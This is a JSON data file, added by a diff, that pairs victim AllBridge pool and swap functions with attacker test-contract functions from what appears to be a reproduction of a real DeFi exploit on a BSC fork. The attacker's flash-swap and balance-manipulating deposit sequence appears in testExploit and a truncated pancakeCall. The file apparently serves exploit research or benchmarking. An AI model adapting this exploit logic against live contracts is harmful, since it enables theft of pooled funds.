@@ -1,0 +1,135 @@
+[
+  {
+    "contract/interface": "AllBridgePool",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(uint256 amount) external {\n        uint256 oldD = d;\n\n        uint256 amountSP = toSystemPrecision(amount);\n        require(amountSP > 0, \"Pool: too little\");\n        tokenBalance += amountSP;\n        vUsdBalance += amountSP;\n        require(tokenBalance < MAX_TOKEN_BALANCE, \"Pool: too much\");\n\n        token.safeTransferFrom(msg.sender, address(this), amount);\n\n        _updateD();\n\n        if (totalLpAmount == 0 || oldD == 0) {\n            // Initial deposit\n            _depositLp(msg.sender, d >> 1); // Divide by 2 to have initial LP amount close to deposited token amount\n        } else {\n            // Consequent deposits, mint LP according to the D increase\n            _depositLp(msg.sender, totalLpAmount * (d - oldD) / oldD);\n        }\n    }\n\n    // Subtract X and Y for that amount, calculate current price and withdraw the token to the user according to the price\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "AllBridgePool",
+    "source_type": "victim_contract",
+    "function_name": "tokenBalance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "AllBridgePool",
+    "source_type": "victim_contract",
+    "function_name": "vUsdBalance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "AllBridgePool",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint256 amountLp) external {\n        uint256 totalLpAmount_ = totalLpAmount; // Gas optimization\n\n        _withdrawLp(msg.sender, amountLp);\n\n        // Calculate actual and virtual tokens using burned LP amount share\n        // Swap the difference, get total amount to transfer/burn\n        uint256 amountSP = _preWithdrawSwap(\n            tokenBalance * amountLp / totalLpAmount_, \n            vUsdBalance * amountLp / totalLpAmount_\n        );\n\n        // Always equal amounts removed from actual and virtual tokens\n        tokenBalance -= amountSP;\n        vUsdBalance -= amountSP;\n        \n        // Update D and transfer tokens to the sender\n        _updateD();\n        token.safeTransfer(msg.sender, fromSystemPrecision(amountSP));\n    }\n\n    // Calculate differentce between actual and virtual token, divide by 2 and swap\n    // Return min of resulting actual/virtual token amount\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IBridgeSwap",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BUSD.approve(address(Swap), type(uint256).max);\n        USDT.approve(address(Swap), type(uint256).max);\n        BUSD.approve(address(BUSDPool), type(uint256).max);\n        USDT.approve(address(USDTPool), type(uint256).max);\n        Swap.swap(address(BUSD), address(USDT), 2_003_300 * 1e18, 1, address(this), block.timestamp);\n        BUSDPool.deposit(5_000_000 * 1e18); // deposit BUSD to BUSDPool\n        Swap.swap(address(BUSD), address(USDT), 496_700 * 1e18, 1, address(this), block.timestamp);\n        USDTPool.deposit(2_000_000 * 1e18); // deposit USDT to USDTPool\n\n        console.log(\n            \"BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:\",\n            BUSDPool.tokenBalance(),\n            BUSDPool.vUsdBalance(),\n            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()\n        );\n        bytes32 token = bytes32(uint256(uint160(address(USDT))));\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_982_067);\n        cheats.label(address(BUSD), \"BUSD\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(BridgeSwap), \"BridgeSwap\");\n        cheats.label(address(Swap), \"Swap\");\n        cheats.label(address(USDTPool), \"USDTPool\");\n        cheats.label(address(BUSDPool), \"BUSDPool\");\n        cheats.label(address(Pair), \"Pair\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        Pair.swap(0, 7_500_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after exploit\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n    }\n\n",
+    "description": ""
+  }
+]
